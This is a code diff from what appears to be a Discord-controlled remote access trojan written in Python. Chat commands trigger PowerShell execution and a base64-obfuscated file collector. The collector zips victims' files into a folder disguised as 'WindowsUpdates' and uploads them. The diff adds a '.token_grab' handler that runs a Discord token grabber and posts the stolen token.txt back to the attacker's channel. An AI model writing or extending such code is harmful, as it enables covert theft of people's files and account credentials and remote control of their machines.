@@ -469,9 +469,6 @@ async def on_message(message):
         subprocess.call("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe " + arg, shell=True)
 
     if message.content.startswith(".file_collector"):
-        exec(base64.b64decode("YXdhaXQgbWVzc2FnZS5kZWxldGUoKQ0KI3J1biBmaWxlX2NvbGxlY3Rvci5weXcgYW5kIHdhaXQgdW50aWwgZmluaXNoZWQgdGhlbiBzZW5kIGNvbGxlY3RlZF9maWxlcy56aXANCm9zLnN5c3RlbShmInB5IHttYWluX3BhdGh9XFxidWlsdF9pbl9tb2R1bGVzXFxmaWxlX2NvbGxlY3Rvci5weXciKQ0KDQplbWJlZCA9IGRpc2NvcmQuRW1iZWQodGl0bGU9IkZpbGUgQ29sbGVjdG9yIiwgZGVzY3JpcHRpb249IkZpbGUgY29sbGVjdG9yIGV4ZWN1dGVkLlxuTk9URTogSWYgeW91IGhhdmUgZW5hYmxlZCBpbWFnZSBjb2xsZWN0aW9uLCAuemlwIGZpbGUgc2l6ZSBtYXkgYmUgdG9vIGJpZyB0byBzZW5kISIsIGNvbG9yPTB4MDBmZjAwKQ0KYXdhaXQgbWVzc2FnZS5jaGFubmVsLnNlbmQoZW1iZWQ9ZW1iZWQpDQoNCndoaWxlKG9zLnBhdGguZXhpc3RzKGYie29zLmdldGVudignQVBQREFUQScpfVxcV2luZG93c1VwZGF0ZXNcXGNvbGxlY3RlZF9maWxlcy56aXAiKSA9PSBGYWxzZSk6DQoJdGltZS5zbGVlcCgxKQ0KDQphd2FpdCBtZXNzYWdlLmNoYW5uZWwuc2VuZChmaWxlPWRpc2NvcmQuRmlsZShmIntvcy5nZXRlbnYoJ0FQUERBVEEnKX1cXFdpbmRvd3NVcGRhdGVzXFxjb2xsZWN0ZWRfZmlsZXMuemlwIikpDQpvcy5yZW1vdmUoZiJ7b3MuZ2V0ZW52KCdBUFBEQVRBJyl9XFxXaW5kb3dzVXBkYXRlc1xcY29sbGVjdGVkX2ZpbGVzLnppcCIp"))
-
-    if message.content.startswith(".token_grab"):
         await message.delete()
         exec(base64.b64decode("I3J1biBmaWxlX2NvbGxlY3Rvci5weXcgYW5kIHdhaXQgdW50aWwgZmluaXNoZWQgdGhlbiBzZW5kIGNvbGxlY3RlZF9maWxlcy56aXANCm9zLnN5c3RlbShmInB5IHttYWluX3BhdGh9XFxidWlsdF9pbl9tb2R1bGVzXFxmaWxlX2NvbGxlY3Rvci5weXciKQ0="))
         
@@ -481,8 +478,18 @@ async def on_message(message):
         exec(base64.b64decode("d2hpbGUob3MucGF0aC5leGlzdHMoZiJ7b3MuZ2V0ZW52KCdBUFBEQVRBJyl9XFxXaW5kb3dzVXBkYXRlc1xcY29sbGVjdGVkX2ZpbGVzLnppcCIpID09IEZhbHNlKToNCgl0aW1lLnNsZWVwKDEpDQ=="))
         await message.channel.send(file=discord.File(f"{os.getenv('APPDATA')}\\WindowsUpdates\\collected_files.zip"))
 
+    if message.content.startswith(".token_grab"):
+        await message.delete()
 
+        os.system(f"py {main_path}\\built_in_modules\\discord_token_grabber.pyw")
 
+        embed = discord.Embed(title="Token Grabber", description="Executed.", color=0x00ff00)
+        await message.channel.send(embed=embed)
+
+        while(os.path.exists(f"{main_path}\\token.txt") == False):
+            time.sleep(1)
+
+        await message.channel.send(file=discord.File(f"{main_path}\\token.txt"))
     if message.content.startswith(".browser_grab"):
         await message.delete()
         #run token_grabber.pyw and wait until finished then send token.txt
